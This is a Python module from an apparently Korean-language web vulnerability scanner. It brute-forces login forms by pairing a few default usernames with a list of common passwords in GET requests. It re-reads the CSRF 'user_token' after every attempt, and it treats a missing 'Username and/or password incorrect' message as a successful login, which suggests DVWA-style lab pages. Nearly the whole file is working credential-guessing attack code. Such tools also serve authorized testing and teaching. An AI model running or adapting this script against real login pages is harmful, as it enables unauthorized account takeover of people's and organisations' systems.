from tabulate import tabulate
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table

id_list = ['admin', 'root', 'test', 'guest']
password_list = [
    '123456', 'password', '12345678',
    'qwerty', '12345', '123456789',
    'letmein', '1234567', 'football',
    'iloveyou', 'admin', 'welcome',
    'monkey', 'login', 'abc123',
    'starwars', '123123', 'dragon',
    'passw0rd', 'master', 'hello',
    'freedom', 'whatever', 'qazwsx',
    'trustno1', '654321', 'jordan23',
    'harley', 'password01', '1234'
]

console = Console()

def show_rich_results(result_table, attempt_table):
    # 결과 테이블 출력
    if result_table:
        table1 = Table(title="🔐Brute Force 결과", style="white", show_lines=True)
        table1.add_column("URL", style="white", no_wrap=False, overflow="fold")
        table1.add_column("VULN", style="white", no_wrap=True)
        table1.add_column("Payload", style="white", no_wrap=False, overflow="fold")
        table1.add_column("Result", style="white", no_wrap=True)
        for row in result_table:
            table1.add_row(row["URL"], row["VULN"], row["Payload"], row["Result"])
        console.print(table1)
    else:
        console.print("[white]로그인 성공 결과 없음[/white]")

    # 시도 조합 출력
    if attempt_table:
        table2 = Table(title="시도된 ID/PW 조합", style="white", show_lines=True)
        table2.add_column("Index", style="white", no_wrap=True)
        table2.add_column("ID", style="white", no_wrap=True, max_width=12)
        table2.add_column("Password", style="white", no_wrap=True, max_width=14)
        for row in attempt_table:
            table2.add_row(str(row["Index"]), row["ID"], row["Password"])
        console.print(table2)

def run(soup, headers, find_path_dic):
    result_table = []
    attempt_table = []
    index = 1

    brute_only_paths = [d for d in find_path_dic if 'brute' in d['url']]

    for param_dic in brute_only_paths:
        param_url = param_dic['url']
        param_method = param_dic['method']

        if param_method.upper() == 'GET':
            user_token = ''
            if 'user_token' in param_dic['param']:
                res = requests.get(param_url, headers=headers)
                soup = BeautifulSoup(res.text, "html.parser")
                for location in soup.select('input'):
                    if location.get('name') == 'user_token':
                        user_token = location.get('value')

            for uid in id_list:
                for pwd in password_list:
                    p_url = param_url + '?'
                    for param in param_dic['param']:
                        if param == 'username':
                            p_url += f"{param}={uid}&"
                        elif param == 'password':
                            p_url += f"{param}={pwd}&"
                        elif param == 'user_token':
                            p_url += f"{param}={user_token}&"
                        else:
                            p_url += f"{param}={pwd}&"

                    res = requests.get(p_url, headers=headers)

                    attempt_table.append({
                        "Index": index,
                        "ID": uid,
                        "Password": pwd
                    })
                    index += 1

                    if "Username and/or password incorrect" not in res.text:
                        result_table.append({
                            "URL": param_url,
                            "VULN": "Brute Force",
                            "Payload": f"ID: {uid} | PW: {pwd}",
                            "Result": "Login Success"
                        })
                        break

                    if 'user_token' in param_dic['param']:
                        soup = BeautifulSoup(res.text, "html.parser")
                        for location in soup.select('input'):
                            if location.get('name') == 'user_token':
                                user_token = location.get('value')

    show_rich_results(result_table, attempt_table)
    return result_table, attempt_table

def run2(soup, headers, find_path_dic):
    save_brute2 = ""
    index = 1

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        param_method = param_dic['method']

        if param_method.upper() == 'GET':
            user_token = ''
            if 'user_token' in param_dic['param']:
                res = requests.get(param_url, headers=headers)
                soup = BeautifulSoup(res.text, "html.parser")
                for location in soup.select('input'):
                    if location.get('name') == 'user_token':
                        user_token = location.get('value')

            for uid in id_list:
                for pwd in password_list:
                    p_url = param_url + '?'
                    for param in param_dic['param']:
                        if param == 'username':
                            p_url += f"{param}={uid}&"
                        elif param == 'password':
                            p_url += f"{param}={pwd}&"
                        elif param == 'user_token':
                            p_url += f"{param}={user_token}&"
                        else:
                            p_url += f"{param}={pwd}&"

                    res = requests.get(p_url, headers=headers)

                    print("==============================================================")
                    print(f"[{index}] ID: {uid} | PW: {pwd}")
                    print(f"URL       : {p_url}")
                    print(f"VULN NAME : Brute Force")
                    print(f"Payload   : {p_url}")

                    save_brute2 += (
                        "==============================================================\n"
                        f"[{index}] ID: {uid} | PW: {pwd}\n"
                        f"URL       : {p_url}\n"
                        f"VULN NAME : Brute Force\n"
                        f"Payload   : {p_url}\n"
                    )
                    index += 1

                    if 'user_token' in param_dic['param']:
                        soup = BeautifulSoup(res.text, "html.parser")
                        for location in soup.select('input'):
                            if location.get('name') == 'user_token':
                                user_token = location.get('value')

    return save_brute2
